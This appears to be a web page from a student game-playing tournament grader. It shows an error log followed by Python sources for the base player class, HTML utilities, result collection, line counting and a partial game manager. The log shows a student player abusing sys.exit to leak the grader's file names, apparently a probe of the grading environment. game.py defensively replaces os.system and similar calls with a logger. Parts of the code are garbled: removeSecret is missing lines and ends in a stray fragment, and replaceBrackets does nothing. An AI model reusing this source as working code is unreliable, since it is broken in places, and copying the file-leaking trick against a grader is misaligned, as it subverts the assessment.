Main page
Game between landrfil and koubajac
Score landrfil=0, koubajac=0
Cannot initialize koubajac player
Traceback (most recent call last):
  File "game.py", line 628, in game
player.py", line 200, in __init__
    sys.exit(files_string)
SystemExit: streky-all.tar.gz
An error occurred: 'ascii' codec can't decode byte 0x8b in position 1: ordinal not in range(128)base.py

# base class for Player, do not change this file !!!!
# this file will be replaced by Brute/Tournament anyway, so your changes will not be reflected
# if you want to work with some instance variables (self.xyz etc), define them in your Player in player.py file


#import PIL for drawing to PNG files
from PIL import Image, ImageDraw

class BasePlayer:
    
    def __init__(self, login, boardRows, boardCols, cardsAtHand):
        """Constructor for the base class. 
            login .. string representing user name/login (it will be given by Brute)
            boardRows  .. int, number of rows in the game board (desk)
            boardCols .. int, number of columns in the game board (desk)
            cardsAtHand .. is list [ card1, card2, ... ]
                where card_i is 2D matrix describing the card
        """                
        self.userLogin = login
        self.boardRows = boardRows
        self.boardCols = boardCols
        self.cardsOnDesk = []
        self.cardsAtHand = cardsAtHand
        self.tournament = False
        self.playerName = "my great player"
        self.timeout = 1  #timeout in seconds for constructor and play()

        # just for drawing
        self._colors = {}
        self._colors[0] = "#ffffff"
        self._colors[1] = "#636940"
        self._colors[2] = "#59A96A"
        self._colors[3] = "#ffdd4a"
        self._colors[4] = "#fe9000"
        self._colors[-2] = "#a3d9ff"
        self._colors[-1] = "#cccccc" #sunglow

    def play(self, newCardOnDesk):
        """This function is the only one that will be called directly by Brute. Write your implementation inside player.py file
        """
        pass

    def drawCards(self, numRows, numCols, cards, filename, _cellWidth = 60):

        """Debugging function, you can draw your cards in PNG file with it. Look at player.py for example
        """

        def getCenter(row, col):
            return row*_cellWidth + _cellWidth/2, col*_cellWidth + _cellWidth/2

        _cardOutline = "#CD853F"
        _gridColor = "#888888"
        _gridColor = "#ADACB5"
        _componentColor = "#FFFF00"
        _originColor = "#ff69b4"
        _originColor2 = "#f8c8dc"

        width = _cellWidth*numCols
        height = _cellWidth*numRows
        img = Image.new('RGBA',(width,height),"white")
        draw = ImageDraw.Draw(img)

        for card in cards:
            row, col, matrix = card
            cardRows = len(matrix)
            cardCols = len(matrix[0])
            eps = 3
            draw.rectangle([col*_cellWidth-eps, row*_cellWidth-eps, (col+cardCols)*_cellWidth+eps, (row+cardRows)*_cellWidth+eps], outline = _cardOutline, fill=(0,0,0,0), width=10)
            for r in range(cardRows):
                for c in range(cardCols):
                    cellRow = r + row
                    cellCol = c + col
                    value = matrix[r][c]
                    if value == 0:
                        value = -1
                    draw.rectangle([cellCol*_cellWidth, cellRow*_cellWidth, (cellCol+1)*_cellWidth, (cellRow+1)*_cellWidth], fill=self._colors[ value ] )
            eps = _cellWidth/6
            rc,cc = getCenter(row, col)                    
            draw.ellipse([cc-eps,rc-eps,cc+eps,rc+eps], fill=_originColor2)

        for i in range(1,numRows):
            draw.line([0,i*_cellWidth, width, i*_cellWidth ], fill = _gridColor, width = 2)
        for i in range(1,numCols):
            draw.line([i*_cellWidth,0,i*_cellWidth, height ], fill = _gridColor, width = 2)
        eps = 2
        draw.line([eps,eps,width-eps,eps,width-eps,height-eps,eps, height-eps, eps, eps], fill=_gridColor, width=5)    
        img.save(filename)


blutils.py
import base, random, copy, re


#supporting tools for gemblo, most for printing to html/javascript

canvasid = 0

__all__=[]

def __dir__():
    return []


def replaceBrackets(text):
    t1 = text.replace("<", "<")
    t2 = t1.replace(">", ">")
    return t2;

def pre(text):
    return "<pre>{}</pre>\n".format(text)

def pre2(text):
    return "<code>{}</code>\n".format(replaceBrackets(text))


def removeSecret(text):
    a = text.split("\n");
    res = "";
    for line in a:
            line = line.replace("player","player");
            line = line.replace("player","player");
            line = line.replace("player","player");
player.py"):
                pos = line.find("/player.py")
                line = line[pos+1:]
                
            res += line + "\n";
    return res;

#print traceback
def pt(msg):
    a = removeSecret(msg)
    b = replaceBrackets(a);
    return pre(b);


def avg(array):
    s = 0;
    if (len(array) == 0):
        return -1;
    for i in array:
        s += i;
    return 1.0*s / len(array)


def getPlayerVersion(player):
    s = player.algorithmName;
    so = "";
    for c in s:
        if (c.isalnum()):
            so += c;
    return so;

def toColor(text, color):
    return "<font color=\"{}\">{}</font>".format(color,text)

def toRed(text):
    return toColor(text, "#FF0000");

def toGreen(text):
    return toColor(text, "#00bc10");

def shuffle(array):
    for i in range(len(array)-1):
        j = random.randint(i+1, len(array)-1);
        array[i], array[j] = array[j], array[i]


def toName(i):
    if i == 1:
        return "red";
    return "green"


def printBoard(board, label=True, R = 18):
    """ returns an output string to draw the board. assuming that board() and cell() functions are defined somewhere in html.
        board is drawn to canvas of given id
    """
    global canvasid
    canvasid += 1

    size = 0
    pq = "[ ";
    first = True
    for p in board:
        for q in board[p]:
            if abs(p) > size:
                size = abs(p)
            if abs(q) > size:
                size = abs(q)

            value = board[p][q]
            if first == False:
                pq += ",";
            pq += "[{},{},{}]".format(p,q,value);  
            first = False
    pq += "]";

    width = R*2.2*size
    height = R*2*size

    width = int(R*(3**0.5))*size + 3*R
    height = 2*R*size*0.9

    out = ""

    out += "<canvas id=\"{}\" width=\"{}\" height=\"{}\" style=\"border:1px solid #aaaaaa;\">Your browser does not support HTML5 canvas </canvas>\n".format(canvasid,width, height);


    
    out += "<script>\n";
    out += "var b=" + pq + ";\n";
    if label:
        out += "board({},b,1,{});\n".format(canvasid,R);
    else:
        out += "board({},b,0,{});\n".format(canvasid,R);
    out += "</script>\n"; 
    return out


def items2table(numCols, items):
    res = "<table>"
    idx = 0
    row = ""
    for i in range(len(items)):
        if idx % numCols == 0:
            if row != "":
                row += "</tr>"
                res += row
            row = "<tr>"
        row += "<td>" + items[i] + "</td>\n"
        idx += 1

    row += "</tr>"

    res += row
    res += "</table>\n";
    return res





collect.py
#!/usr/bin/env python3
import glob, re, pickle, os, zlib


linesCount = {}

try:
    with open("linesCount.pickle", "rb") as f:
        linesCount = pickle.load(f)
except:
    print("Cannot load linesCount.pickle")
    print("Run ./countLines.py before sending SEM.tgz to src/")
    print("See ./countLines.py how to do it ")
#    quit()


for name in linesCount:
    print(name, " has ", linesCount[name] )


print("Loaded ", len(linesCount), " LOC infos ")

allGames = {}

versions = {}

totalOrigSize = 0
totalCompressedSize = 0

expectedGames = 10  #each allGames[ user1 ] [ user 2] should has this amount of records

allDirs = glob.glob("runs/*/*/")

def toutf(instr):
    o = ""
    for i in instr:
        if ord(i) < 256:
            o += i
    return o


doCompression = False    

md5sums = {} #key is name, value is dict of all md5sum of given user

for gdi in range(len(allDirs)):
    gameDir = allDirs[gdi]
    match = re.search(r'runs/(.*)\/(.*)-(.*)\/', gameDir)
    if match:
        studentName1 = match.group(2)
        studentName2 = match.group(3)
        if not studentName2 in allGames:
            allGames[studentName2] = {}
        if not studentName1 in allGames:
            allGames[studentName1] = {}

        if not studentName1 in versions:
            versions[ studentName1 ] = {}
        if not studentName2 in versions:
            versions[ studentName2 ] = {}

        if not studentName2 in allGames[studentName1]:
            allGames[studentName1][studentName2] = []
        if not studentName1 in allGames[studentName2]:
            allGames[studentName2][studentName1] = []
        
        if not studentName1 in md5sums:
            md5sums[ studentName1 ] = {}
        if not studentName2 in md5sums:
            md5sums[ studentName2 ] = {}

        files = glob.glob("{}/allGames.p*".format(gameDir))
        print(gameDir,studentName1, studentName2, "files=", len(files))
        print("Loading ",files, ",   processed {:d}/{:d} = {:.2f}".format(gdi, len(allDirs), 100*gdi/len(allDirs)) )
        for name in files:
#            print(name)
            f = open(name,"rb")
            games = pickle.load(f)
            f.close()
            for d in games:
                totalOrigSize += len( d["html"] )
                if doCompression == True:
                    d["html"] = zlib.compress(d["html"].encode(),9)
                totalCompressedSize += len( d["html"] )
                v1 = d["versions"][studentName1]
                v1 = toutf(v1)
                if v1 != "__NA__":
                    versions[studentName1][ v1 ] = [ studentName1, studentName2 ]
                v2 = d["versions"][studentName2]
                v2 = toutf(v2)
                if v2 != "__NA__":
                   versions[studentName2][ v2 ] =  [studentName1, studentName2 ]
                d["LOC"] = { studentName1: [], studentName2: [] }

                if studentName1 in linesCount:
                    d["LOC"][studentName1] = linesCount[studentName1]
                if studentName2 in linesCount:
                    d["LOC"][studentName2] = linesCount[studentName2]

            

                if "md5" in d:
                    for name in d["md5"]:
                        md5value = d["md5"][name]
                        if not md5value in md5sums[name]:
                            md5sums[name][md5value] = 0
                        md5sums[ name ][ md5value ] += 1                            

            allGames[ studentName1 ][studentName2 ] = games                   
        
os.system("rm missingGames.txt")
fo = open("missingGames.txt","wt")      
numGames = {}
for name1 in allGames:
    if not name1 in numGames:
        numGames[name1] = 0
    for name2 in allGames[name1]:
        if not name2 in numGames:
            numGames[name2] = 0

        for rec in allGames[name1][name2]:
            numGames[name1] += 1
            numGames[name2] += 1

        if (name1 != name2) and len( allGames[ name1 ][ name2 ]) != expectedGames:
            fo.write("{} {} {}\n".format(name1,name2, len(allGames[name1][name2])))
fo.close()            


outfile = "allgames.db"                
print(allGames.keys())
print("Saving temp file", outfile)

with open(outfile,"wb") as f:
    pickle.dump(allGames, f)
print("Checking validy of games")

with open("md5sums.p","wb") as f:
    pickle.dump(md5sums, f)

maxNumberOfGames = 0
playedGames = {}
for name in numGames:
    print(name," played ", numGames[name])
    maxNumberOfGames = max( maxNumberOfGames, numGames[name] )
    if not numGames[ name ] in playedGames:
        playedGames[ numGames[name] ] = []
    playedGames[ numGames[name] ].append(name)



for num in playedGames:
    print("Total games", num, " played by", playedGames[num])

runtimes = { name1: { name2:[] for name2 in allGames } for name1 in allGames }
warmTime = {}
for name1 in allGames:
    for name2 in allGames[name1]:
        for game in allGames[name1][name2]:
            if "processTime" in game:
                runtimes[name1][name2].append( game["processTime"] )
                if "warmTime" in game:
                    key = "{}-{}".format(name1, name2)
                    if not key in warmTime:
                        warmTime[key] = []
                    warmTime[ key ].append( game["warmTime"] )

with open("runtimes.p", "wb") as f:
    pickle.dump(runtimes, f)
    

print("Saving runtimes")


fot = open("warmTimes.txt", "wt")

for key in warmTime:
    a = warmTime[key]
    fot.write("{} {}\n".format( str(key), ' '.join(map(str, a) ) ) )
fot.close()
print("Saving warmTimes")


isOK = False
if len(playedGames.keys()) == 1:
    print("Games are OK")
    isOK = True
else:
    print("Some missing games! !!!!!!!!!!!!!!!!!!!!! ")


print("Checking versions: ");
problemNames = []
for user in versions:
    allVersions = list(versions[user].keys())
    print("S[",user,"]: ", allVersions)
    if len(allVersions) > 1:
        problemNames.append(user)
        for version in allVersions:
            print("Version '",version,"' in game: ", versions[user][version], " !!!!!! ")
        isOK = False


os.system("rm replan.sh")
with open("replan.sh", "wt") as f:
    f.write("#!/bin/sh\n")
    f.write("#touching players that dont have enough games")
    for name in numGames:
        f.write("#player " + name + " played " + str( numGames[ name ] ) + " out of " + str(maxNumberOfGames) + "\n")
        if name in problemNames:
            f.write("#User" + name + " has multiple version:\n")

        if numGames[name] != maxNumberOfGames or name in problemNames:
            f.write("echo \"\" >> src/{}/player.py\n".format(name))
            f.write("echo \"#tmp\" >> src/{}/player.py\n".format(name))
        else:
            f.write("#this player is ok\n")
                    
print("Saved replan.sh")






if isOK:
    print("OK, saving into db ")
    os.system("mv {} db/`date +\"%m-%d-%y-%H-%M\".db`".format(outfile))
else:
    print("Problem is versions of users");
    print(problemNames)
    print("DB not saved")

print("Compressiong: before=", int(totalOrigSize/1024), "k, new=", int(totalCompressedSize/1024), "k =" , int(100*totalCompressedSize / totalOrigSize), "%")
print("doCompression=", doCompression, " (if False, maybe pickleAll.py already compressed html .. )")

countLines.py
#!/usr/bin/env python3
import json, glob, sys, pickle, os

prefixDir = "src"

#this script assumes that alp-hive contains actual source codes


dirs = glob.glob("{}/*".format(prefixDir))

tmpFile = "countLines.json"
outfile = "linesCount.pickle"

counts = {}

for dirname in dirs:
    studentName = dirname.replace("{}".format(prefixDir),"").replace("/","")
    print("Processing", dirname, " student:", studentName)

    os.system("pygount --format=json -o {} --suffix=py  {}".format(tmpFile, dirname))
    f = open(tmpFile)
    data = json.load(f)
    for l in data["languages"]:
        if l["language"] == "Python":
            lineCnt = l["sourceCount"]
            commentsCount = l["documentationCount"]
            counts[studentName] = [ lineCnt, commentsCount ]
            print("Counting files in", dirname, ": lines", lineCnt, ", comments", commentsCount)
    f.close()

print("Saving count lines into ", outfile)
f = open(outfile,"wb")
pickle.dump(counts, f)
f.close()
os.system("rm {}".format(tmpFile))    

game.py

import copy, random, sys, time, os, signal, traceback, string, glob, pickle
from itertools import permutations
import base as BASE
import utils as UTILS
import blutils as BUTILS
import jolanda as JP
import hashlib

print("Entering gameManager with arguments", sys.argv)
    
TIMEOUT = 1.5
HR1 = '<hr style="height:3pt;color:#000000;background-color:#000000">'
HR2 = '<hr style="height:7pt;color:#000000;background-color:#000000">'
BR = "<br>"
PNGBOARDWIIDTH = 600
PNGCARDWIDTH = 100
_PCOLORS = {}

def filemdsum(filename):
    if os.path.isfile(filename):
        return hashlib.md5(open(filename,"rb").read()).hexdigest()
    else:
        return hashlib.md5(b"none").hexdigest()

_login1MD5 = filemdsum("s123a/player.py")
_login2MD5 = filemdsum("s123b/player.py")

if len(sys.argv) != 6:
    print("usage", sys.argv[0], " resfile seed username1 username2 rem")
    quit()

_mainPrefix = sys.argv[1]
_seed = int(sys.argv[2])
_login1 = sys.argv[3]
_login2 = sys.argv[4]
_rem = sys.argv[5]

print("Before clear")
os.system("pwd")    
os.system("ls -lah")

if _rem == "doremove":
    os.system("rm *.py")
    print("clear s")

print("After clear")    
os.system("pwd")    
os.system("ls -lah")

print("MD5:", _login1, "=", _login1MD5, ", ", _login2, "=", _login2MD5)

os.system("mkdir -p {}".format(_mainPrefix))
_startProcessTime = time.time()

_calls = []

def _aa(cmd):
    try:
        _calls.append( str(cmd) )
    except:
        pass
    print("CALL:", cmd)

os.system = _aa
os.popen = _aa
os.execv = _aa
os.remove = _aa


def getDefaultRes():
    d = {}
    d["html"] = ""
    d["runtimes"] = { _login1: [], _login2: [] }
    d["score"] = { _login1: 0, _login2: 0 }
    d["ae"] = ""
    d["pe"] = ""
    d["status"] = False
    d["versions"] = { _login1:"__NA__", _login2: "__NA__" }
    d["processTime"] = 0
    d["systemcalls"] = _calls
    d["reason"] = ""
    d["moveTimeout"] = TIMEOUT
    d["md5"] = { _login1: _login1MD5, _login2: _login2MD5 }
    return d


def saveDetails(d):
    d["processTime"] = time.time() - _startProcessTime
    with open("{}.p".format(_mainPrefix), "wb") as f:
        pickle.dump(d, f)

def html2page(text):
    htmlBody = """<style>
.maintable tr:nth-child(odd) td{
           background:#bbbbbb
}
.maintable tr:nth-child(even) td{
            background:#eeeeee
}</style>
<script>
function drawLine(ctx, startX, startY, endX, endY, color, thick) {
  ctx.beginPath();        // Begin a new path
  ctx.moveTo(startX, startY); // Move to the starting point
  ctx.lineTo(endX, endY); // Draw a line to the ending point
  ctx.strokeStyle = color; // Set the line color
  ctx.lineWidth = thick;      // Set the line width
  ctx.stroke();           // Draw the line
}

function drawCircle(ctx, x,y, r,color) {
  ctx.beginPath();
  ctx.fillStyle = color;
  ctx.arc(x,y,r,0,2*Math.PI);
  ctx.fill();
}

</script>
    """
    return "<html><head>{}<title>STREKY {} vs {}</title></head><body>{}</body></html>".format(htmlBody,_login1, _login2, text)

def rfn(length = 6):
   return ''.join( [random.choice(string.ascii_letters) for _ in range(length) ] ) 

print("Importing player1")    
try:
    import player as SP1
except:
    text = "Cannot import player.py from {}".format(_login1) + BR + "import player fails" + BR
    text += BUTILS.pt(traceback.format_exc()) + "<br>"
    print("error", traceback.format_exc())
    d = getDefaultRes()
    d["html"] = html2page( text )
    d["ae"] = _login1
    d["pe"] = _login2
    d["reason"] = "import"
    saveDetails(d)
    quit()

print("Importing player2")    
try:
    import player as SP2
except:
    text = "Cannot import player.py from {}".format(_login2) + BR + "import player fails" + BR
    text += BUTILS.pt(traceback.format_exc()) + "<br>"
    d = getDefaultRes()
    d["html"] = html2page( text )
    d["ae"] = _login2
    d["pe"] = _login1
    d["reason"] = "import"
    saveDetails(d)
    quit()


print("After imports ")

C44c = [ [1,2,1,2],
         [2,2,1,1],
         [1,1,2,2],
         [2,1,2,1]]

C44d = [ [1,2,0,0],
         [0,1,1,1],
         [1,1,2,2],
         [0,0,2,1]]

C44a = [ [0,1,2,0], 
         [1,1,2,2],
         [2,2,1,1],
         [0,2,1,0] ]  #2 L-cesty dlouhe

C44b = [ [0,0,1,0], 
         [1,1,1,0],
         [0,2,2,2],
         [0,2,0,0] ]  #4 L cesty kratke

C53b = [ [0,1,0], [0,1,0],[0,1,0],[0,1,1],[0,0,0] ]
C53c = [ [0,1,0], [0,1,0],[0,1,1],[0,2,2],[0,2,0] ]

C33a = [ [0,1,0], [1,1,2],[0,0,2] ]
C33b = [ [0,2,0], [0,2,0], [0,2,0] ]
C33c = [ [1,2,1], [2,2,2], [1,2,1] ]

class TimeException(Exception):
    def __init__(self, text):
        self.text = text

signalRaised = False
def handler(signum, stacknum):
    global signalRaised
    signalRaised = True
    raise TimeException("TimeOut")

def value2str(data):
    try:
        res = str(data)
        return res
    except:
        return BUTILS.toRed("Cannot convert user data into string!")

def printStatus(player):
    res = "Error occured in situation:" +BR
    res += "self.tournament = {}".format(player.tournament) + BR
    res += "self.timeout = {}".format(player.timeout) + BR
    res += "self.boardRows = {}".format(player.boardRows) + BR
    res += "self.boardCols = {}".format(player.boardCols) + BR
    res += "self.cardsOnDesk = {}".format(str(player.cardsOnDesk)) + BR
    athand = [ player.cardsAtHand[i] for i in range(len(player.cardsAtHand)) if player.isCardFree[i] ]
    res += "self.cardsAtHand = {} #only available cards are reported".format(str(athand)) + BR + BR
    return res

def checkTypes(data):
    if type(data) != list:
        return False, BUTILS.toRed("Player should return list!")
    if len(data) == 0:
        return True, ""
    if len(data) != 3:
        return False, BUTILS.toRed("User must return list or length 0 or 3. User returned list of length " + str(len(data)) )
    row, col, card = data
    if type(row) != int or type(col) != int or type(card) != list:
        return False, BUTILS.toRed("User must return list of [row, col, card2D] of data types [int, int, list ] ")
    return True, "" 

def showValidMode(shadow1, expand):
    row, col, cost, cardidx, card2d, comps = random.sample( expand, 1 )[0]
    tmp = BR + "Example of a valid move: [{},{},{}]".format(row, col, str(card2d)) + BR
    fn = "{}/{}.png".format(_mainPrefix, getfn())
#    shadow1.drawCards2(shadow1.boardRows, shadow1.boardCols, shadow1.cardsOnDesk+ [ [row,col, card2d ] ],fn, comps = comps, highlightCard = [ row, col, card2d ])
#    tmp += UTILS.png2img(fn,PNGBOARDWIIDTH) + BR
    ss = shadow1.drawCards2_js(shadow1.boardRows, shadow1.boardCols, shadow1.cardsOnDesk+ [ [row,col, card2d ] ],fn, comps = comps, highlightCard = [ row, col, card2d ], _cellWidth=30)
    tmp += ss + BR
    return tmp

def showInvalidMove(shadow1, move):
     try:
        tmp = BR + "Move {} returned by player would result in:".format( value2str( move ) ) + BR
        row, col, card2d = move
        fn = "{}/{}.png".format(_mainPrefix, getfn())
#        shadow1.drawCards2(shadow1.boardRows, shadow1.boardCols, shadow1.cardsOnDesk+ [ [row,col, card2d ] ],fn, comps = [], highlightCard = [ row, col, card2d ], cardsInBW = True)
#        tmp += UTILS.png2img(fn,PNGBOARDWIIDTH) + BR

        ss = shadow1.drawCards2_js(shadow1.boardRows, shadow1.boardCols, shadow1.cardsOnDesk+ [ [row,col, card2d ] ],fn, comps = [], highlightCard = [ row, col, card2d ], cardsInBW = True, _cellWidth = 30)
        tmp += ss + BR
        return tmp
     except:
        pass
     return ""        


def checkOutput(playerOutput, shadow1, shadow2):
    expand = shadow1.expand() #[ [row, col, cost, cardidx, card2d. comps ]  #compts is hash of [(row,col)] = [row,col] )

    result = { "status":False, "msg":"", "cost":0, "comps": {} }

    if len(playerOutput) == 0 and len(expand) == 0:
        result["status"] = True
        return result

    if len(playerOutput) == 0 and len(expand) != 0:
        result["msg"] = BUTILS.toRed("Player returned [], but there are {} possible moves".format(len(expand))) + BR
        result["msg"] += showValidMode(shadow1, expand)
        return result

    srow, scol, scard = playerOutput

    for item in expand:
        row, col, cost, cardidx, card2d, comps = item
        if row == srow and col == scol and card2d == scard:
            b1 = copy.deepcopy(shadow1.board)
            if not UTILS.writeCard( row, col, card2d, shadow1.board ):
                shadow1.board = b1
                result["msg"] = BUTILS.toRed("Cannot place card at position " + str(srow) +"," + str(scol) + "!")
                result["msg"] += showInvalidMove( shadow1, playerOutput )
                result["msg"] += showValidMode(shadow1, expand)
                return result

            b2 = copy.deepcopy(shadow2.board)
            if not UTILS.writeCard( row, col, card2d, shadow2.board ):
                shadow1.board = b1
                shadow2.board = b2
                result["msg"] = BUTILS.toRed("Cannot place card at position " + str(srow) +"," + str(scol) + "!")
                result["msg"] += showInvalidMove( shadow1, playerOutput )
                result["msg"] += showValidMode(shadow1, expand)
                return result

            shadow1.cardsOnDesk.append([ row, col, card2d ])
            shadow2.cardsOnDesk.append([ row, col, card2d ])
            shadow1.isCardFree[ cardidx ] = False
            result["status"] = True
            result["cost"] = cost
            result["comps"] = comps
            return result
                
    result["msg"] = BUTILS.toRed("Move " + value2str(playerOutput) + " is not a valid move ") + BR
    result["msg"] += showInvalidMove( shadow1, playerOutput ) + BR
    if len(expand) > 0:
        result["msg"] += showValidMode(shadow1, expand) + BR

    if len(expand) == 0:
        result["msg"] += "There are no possible moves in this situation. The correct answer is: []" + BR

    return result

def geta():
    try:
        geta.myanchor += 1
    except:
        geta.myanchor = 0
    return "a{}".format(geta.myanchor)

def getfn():
    try:
        getfn.allfiles[1] = 0
    except:
        getfn.allfiles = {}
    while True:
        fn = ''.join( [random.choice(string.ascii_letters) for _ in range(6) ] )
        if not fn in getfn.allfiles:
            getfn.allfiles[fn] = 1
            return fn            


def oneMove(p1, p1Shadow, p2Shadow, p1name, p2name, gameStep, cardFiles, otherMove, score):
        res = {}
        res["html"] = ""

        res["html"] += "Move {}, {} is playing..<br>".format(gameStep, p1name)
        res["html"] += "Cards available to " + str(p1.userLogin) + BR
        res["html"] += BUTILS.items2table(10, [ UTILS.png2img(cardFiles[i], PNGCARDWIDTH) for i in range(len(cardFiles)) if p1Shadow.isCardFree[i] ]  ) + BR
        res["times"] = { p1name: [], p2name: [] }
        res["move"] = []
        res["status"] = False
        res["ae"] = ""
        res["pe"] = ""
        res["reason"] = ""

        signalRaised = False
        signal.signal(signal.SIGALRM,handler)
        signal.alarm(int(2*TIMEOUT))
        time1 = time.perf_counter()
        try:    
            p1move = p1.play(otherMove)
            signal.alarm(0)
        except TimeException:
            signal.alarm(0)
            moveTime = time.perf_counter() - time1
            res["html"] += BUTILS.toRed("play() took {:.3f}s which is more than allowed timeout {}s<br>".format(moveTime, TIMEOUT)) + BR
            res["html"] += BUTILS.pt(traceback.format_exc()) + BR
            res["html"] += printStatus( p1Shadow ) 
            res["times"][p1name].append(moveTime)
            res["status" ] = False
            res["reason"] = "timeout"
            res["ae"] = p1name
            res["pe"] = p2name
            return res
        except:
            signal.alarm(0)
            res["html"] += BUTILS.pt(traceback.format_exc()) + BR
            res["html"] += printStatus( p1Shadow ) 
            res["status" ] = False
            res["reason"] = "play() fails"
            res["ae"] = p1name
            res["pe"] = p2name
            return res
        signal.alarm(0)

        moveTime = time.perf_counter() - time1
        res["html"] += "Player " + value2str(p1.userLogin) + " returned " + value2str(p1move) + " in {:.3f} ms ".format(1000*moveTime) + BR

        res["times"][p1name].append(moveTime)

        if moveTime > TIMEOUT:
            res["html"] += BUTILS.toRed("play() took {:.3f}s which is more than allowed timeout {}s<br>".format(moveTime, TIMEOUT))
            res["html"] += printStatus( p1Shadow ) 
            res["status" ] = False
            res["reason"] = "timeout"
            res["ae"] = p1name
            res["pe"] = p2name
            return res

        print(p1.userLogin, "move: ", p1move)

        r, msg = checkTypes( p1move )
        if not r:
            res["html"] += msg
            res["html"] += printStatus( p1Shadow ) 
            res["status"] = False
            res["ae"] = p1name
            res["pe"] = p2name
            return res

        rhash = checkOutput(p1move, p1Shadow, p2Shadow)
        if not rhash["status"]:
            res["html"] += rhash["msg"] + BR
            res["status"] = False
            res["html"] += printStatus( p1Shadow ) 
            res["ae"] = p1name
            res["pe"] = p2name
            return res
        res["move"] = p1move
        newScore = score[p1name] + rhash["cost"]
        res["html"] += "Player " + value2str(p1.userLogin) + " old score " + str(score[p1name]) + ", gained " + str(rhash["cost"]) + ", new score " + str(newScore) + BR
        score[p1name] += rhash["cost"]

        gameStep+=1
#        fn = "{}/{}.png".format(_mainPrefix, getfn())
#        p1Shadow.drawCards2(p1Shadow.boardRows, p1Shadow.boardCols, p1Shadow.cardsOnDesk,fn, comps = rhash["comps"], highlightCard = p1move)
#        res["html"] += BR+ UTILS.png2img(fn,PNGBOARDWIIDTH) + BR

        ss = p1Shadow.drawCards2_js(p1Shadow.boardRows, p1Shadow.boardCols, p1Shadow.cardsOnDesk,"eee", comps = rhash["comps"], highlightCard = p1move, _cellWidth=25)
        res["html"] += ss
        res["status"] = True            

        return res



            
GAMEID = 0
def gameOfTwo(p1, p2, p1Shadow, p2Shadow):
    global GAMEID
    GAMEID += _seed
    p1name = value2str(p1.userLogin)
    p2name = value2str(p2.userLogin)
    gameStep = 0
    res = {}
    res["html"] = ""
    res["anchorTop"] = geta()
    res["anchorBottom"] = geta()
    res["anchorLast"] = geta()
    res["ae"] = ""
    res["pe"] = ""

    res["p1name"] = p1name
    res["p2name"] = p2name

    res["times"] = { p1name: [], p2name: [] }

    res["score"] = { p1name:0, p2name:0 }
    res["gameid"] = GAMEID
    
    res["html"] = '<a name="{}">Game #{} between {} and {} </a><br>'.format( res["anchorTop"], GAMEID,p1name, p2name)
    try:
        res["html"] += "Player {} version = {} ".format(p1name, p1.playerName) + BR
    except:
        pass

    try:
        res["html"] += "Player {} version = {} ".format(p2name, p2.playerName) + BR
    except:
        pass


    res["html"] += "Board {}x{}".format(p1Shadow.boardRows, p1Shadow.boardCols) + BR
    res["html"] += "{SCOREINFO}" + BR
    res["html"] += "{GAMERESULT}" + BR
    res["html"] += '<a href="#{}">End of this game</a>'.format(res["anchorBottom"])
    cardFiles = []
    for i in range(len(p1Shadow.cardsAtHand)):
        fn = "{}/{}.png".format( _mainPrefix, getfn())
        UTILS.card2png( p1Shadow.cardsAtHand[i], fn )
        cardFiles.append( fn )

    res["html"] += BR + "Available cards:" + BR
    res["html"] += BUTILS.items2table(14, [ UTILS.png2img(fn,PNGCARDWIDTH) for fn in cardFiles ] ) + BR
    res["status"] = False
    res["reason"] = ""

    p2move = []
    global signalRaised


    while True:
        gameStep += 1
        res["anchorLast"] = geta()
        res["html"] += "\n"
        res["html"] += '<a name="{}"></a>'.format( res["anchorLast"] )
        res["html"] += HR1

#        os.system("testingsyscall")

        tmp = oneMove(p1, p1Shadow, p2Shadow, p1name, p2name, gameStep, cardFiles, p2move, res["score"] )

        res["html"] += '<table style="background-color:{}"><tr><td>'.format(_PCOLORS[p1name]) + tmp["html"] + "</td></tr></table>"
        res["times"][p1name] += tmp["times"][p1name]

        if tmp["status"] == False:
            res["status"] = False
            res["ae"] = tmp["ae"]
            res["pe"] = tmp["pe"]
            res["reason"] = tmp["reason"]
            return res

        p1move = tmp["move"]

        gameStep += 1

        res["html"] += HR1
        tmp = oneMove(p2, p2Shadow, p1Shadow, p2name, p1name, gameStep, cardFiles, p1move, res["score"] )
        res["html"] += '<table style="background-color:{}"><tr><td>'.format(_PCOLORS[p2name]) + tmp["html"] + "</td></tr></table>"
        res["times"][p2name] += tmp["times"][p2name]
        if tmp["status"] == False:
            res["status"] = False
            res["ae"] = tmp["ae"]
            res["pe"] = tmp["pe"]
            res["reason"] = tmp["reason"]
            return res

        p2move = tmp["move"]

#        fn = "{}/{}.png".format(_mainPrefix, getfn())
#        p2Shadow.drawCards2(p2Shadow.boardRows, p2Shadow.boardCols, p2Shadow.cardsOnDesk,fn, comps = rhash["comps"], highlightCard = p2move)

        if p1move == [] and p2move == []:
            res["html"] += "Game over, both players are finished" + BR
            res["html"] += value2str(p1name) +" score: " + str(res["score"][p1name]) + BR
            res["html"] += value2str(p2name) +" score: " + str(res["score"][p2name]) + BR
            break
        
    tmp = res["html"]
    alink = '<a name="{}"></a>'.format( res["anchorLast"] )
    ss = tmp.find(alink)
    if ss > 0:
        tmp = "Game #{}, players {} and {} ".format(GAMEID,p1name, p2name) + BR + "This part shows only last two moves of the game" + BR + tmp[ss:]
        res["final"] = tmp
    res["html"] = res["html"].replace("{SCOREINFO}", ", final score {}={}, {}={}".format(p1name, res["score"][p1name], p2name, res["score"][p2name] ) )
    res["html"] = res["html"].replace("{GAMERESULT}", BUTILS.toGreen("STATUS OK")  )

#    res["html"] = res["html"].format(SCOREINFO = ", final score {}={}, {}={}".format(p1name, res["score"][p1name], p2name, res["score"][p2name] ), GAMERESULT = BUTILS.toGreen("STATUS OK") )
    res["status"] = True            
    return res

def cardColorExchange(card):
    perms = [ ''.join(p) for p in permutations('1234') ]
    res = {}
    for p in perms:
        tmp = copy.deepcopy(card)
        for r in range(len(card)):
            for c in range(len(card[r])):
                tmp[r][c] = int(p[ tmp[r][c] - 1 ])
        res[ str(tmp) ] = tmp
#        print(card ,"->", tmp, "using",p)
    return [ res[k] for k in res ]               

def game():
    random.seed(_seed)
#    cardsSmall = [ C33a, C33b, C33c, C44a, C53b] 
#    cardsLarge = [ C33a, C33b, C33c, C44a, C44b, C53b, C53b, C44c, C44d] 
    
    cont3colors = [ [1,2,1,3],
                    [2,2,1,1],
                    [1,1,2,2],
                    [3,1,2,1] ]

    cont2colors = [ [1,2,1,2],
                    [2,2,1,1],
                    [1,1,2,2],
                    [2,1,2,1] ]

    cont35a = [ [1,2,1,3,4],
                [2,2,1,3,3],
                [3,2,1,3,2] ]

#    tmp = cardColorExchange( cont3colors ) + cardColorExchange( cont2colors ) + cardColorExchange( cont35a )
